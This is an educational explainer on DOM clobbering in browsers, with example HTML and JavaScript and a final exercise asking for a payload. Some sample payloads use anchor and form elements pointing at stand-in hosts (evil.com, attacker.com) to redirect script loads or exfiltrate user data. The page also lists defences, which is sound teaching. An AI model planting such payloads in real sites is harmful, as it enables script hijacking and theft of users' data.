Frontend Concepts / DOM Clobbering

DOM Clobbering

A technique where HTML elements with specific id or name attributes overwrite global JavaScript variables and DOM API properties — enabling XSS without injecting any script tags.

Advanced Security Browser Quirk
🏷️ Analogy: Name Tag Confusion

Imagine a conference where speakers are identified by name tags. DOM Clobbering is like printing a fake name tag that says "Security Guard" and pinning it on yourself. When someone asks for "the security guard" (JavaScript looks up window.securityGuard), they get you instead of the real guard — because the browser resolves element IDs as global properties.

The Problem: Named Access on the Window Object

The HTML spec defines "named access on the Window object" — any element with an id or name attribute automatically becomes accessible as window[id]. This is a legacy behavior from the 1990s that can't be removed without breaking the web.

<!-- This HTML creates a global variable -->
<img id="config" src="x">

<script>
    // window.config is now the <img> element, not undefined!
    console.log(window.config);        // <img id="config" src="x">
    console.log(typeof window.config); // "object" (HTMLImageElement)
</script>

<!-- The danger: if code checks window.config before defining it -->
<script>
    // Developer expects config to be undefined or their own object
    if (window.config) {
        // Attacker-controlled element reaches this branch!
        loadScript(window.config.src); // Loads from attacker URL
    }
</script>

How DOM Clobbering Works Internally

The Browser's Lookup Chain

  1. When JavaScript accesses window.foo, the browser checks:
  2. Is foo a built-in window property? (e.g., window.location) → Use it
  3. Is there a JS variable foo in scope? → Use it
  4. Is there an element with id="foo" or name="foo"? → Return the element

Advanced Clobbering Techniques

// Technique 1: Clobbering nested properties with <form> + named elements
// Attacker injects:
<form id="config">
    <input name="apiUrl" value="https://evil.com/steal">
    <input name="debug" value="true">
</form>

<script>
    // window.config.apiUrl is now the <input> element
    // window.config.apiUrl.value is "https://evil.com/steal"
    // Code that does: fetch(config.apiUrl) gets toString() → element URL
    console.log(window.config.apiUrl); // HTMLInputElement
    console.log('' + window.config.apiUrl); // "" (toString)
</script>

// Technique 2: Clobbering with <a> for string coercion
// <a> elements toString() to their href — perfect for URL injection
<a id="endpoint" href="https://evil.com/payload.js"></a>

<script>
    // If code does: loadScript(window.endpoint || defaultUrl)
    // window.endpoint.toString() → "https://evil.com/payload.js"
    // The <a> element coerces to its href in string context!
    console.log(`${window.endpoint}`); // "https://evil.com/payload.js"
</script>

// Technique 3: Clobbering document properties
// Elements with name="" can clobber document.* properties
<img name="cookie" src="x">
<script>
    // document.cookie is now the <img> element, not the cookie string!
    // This can break CSRF token extraction that reads document.cookie
    console.log(document.cookie); // HTMLImageElement (not cookies!)
</script>
⚠️ Bypasses CSP and Trusted Types

DOM Clobbering doesn't inject <script> tags — it manipulates existing code logic. This means it can bypass CSP (no inline scripts violated) and potentially bypass Trusted Types (if the clobbered value is used in a context that doesn't hit a DOM sink directly). It's a logic vulnerability, not an injection vulnerability.

Real Attack Chains

// Real-world pattern: Library checks for global config object
// Found in analytics libraries, feature flag SDKs, etc.

// Library code (simplified):
(function() {
    const config = window.analyticsConfig || {};
    const endpoint = config.endpoint || 'https://default-analytics.com';
    
    // If attacker clobbered window.analyticsConfig with an <a> tag
    // pointing to their server, all analytics data goes to them
    fetch(endpoint, { method: 'POST', body: JSON.stringify(userData) });
})();

// Attack: inject into page (via sanitized HTML that allows <a> tags):
// <a id="analyticsConfig" href="https://attacker.com/collect"></a>
// Now all user data is exfiltrated!

Mitigation Strategies

// Defense 1: Use Object.hasOwn() or explicit undefined checks
const config = Object.hasOwn(window, 'myConfig') 
    && typeof window.myConfig === 'object'
    && !(window.myConfig instanceof HTMLElement)
    ? window.myConfig 
    : {};

// Defense 2: Use Maps or module-scoped variables (not window properties)
// Module scope is immune to clobbering
const CONFIG = Object.freeze({ endpoint: 'https://api.myapp.com' });
export default CONFIG;

// Defense 3: Sanitize HTML to strip id and name attributes
// DOMPurify with SANITIZE_NAMED_PROPS option
const clean = DOMPurify.sanitize(dirty, {
    SANITIZE_NAMED_PROPS: true, // Strips id/name from injected HTML
});

// Defense 4: Content-Security-Policy sandbox attribute
// Embed user HTML in sandboxed iframes (no access to parent window)

Where This Lives in Production

  • Google Security Research — Published multiple papers on DOM clobbering as an XSS primitive. Found clobbering bugs in Gmail, Google Maps, and many open-source libraries.
  • DOMPurify — Added SANITIZE_NAMED_PROPS specifically to prevent clobbering. This strips or prefixes id/name attributes in sanitized HTML.
  • WordPress — Vulnerable to clobbering in comment systems where HTML is allowed but <script> is stripped. IDs in user comments can clobber page functionality.

Common Mistakes

  • Assuming sanitized HTML is safe — Most sanitizers allow id and name attributes by default. Sanitized ≠ clobber-free.
  • Using window.x || default pattern — This is the #1 vector for clobbering. An element with id="x" is truthy, so the fallback never triggers.
  • Forgetting document clobbering — name attributes can clobber document.forms, document.images, and named document properties.
  • Testing only in one browser — Clobbering behavior varies slightly. Chrome and Firefox handle collection clobbering differently.

✅ You Truly Understand DOM Clobbering When...

You can construct a clobbering chain that bypasses CSP and achieves code execution using only elements that a typical HTML sanitizer would allow (like <a>, <form>, <img>).

Given a page that loads a library using: const url = window.CDN_BASE || 'https://cdn.example.com'; loadScript(url + '/lib.js'); — craft a DOM clobbering payload using only <a> tags that redirects the script load to your domain.
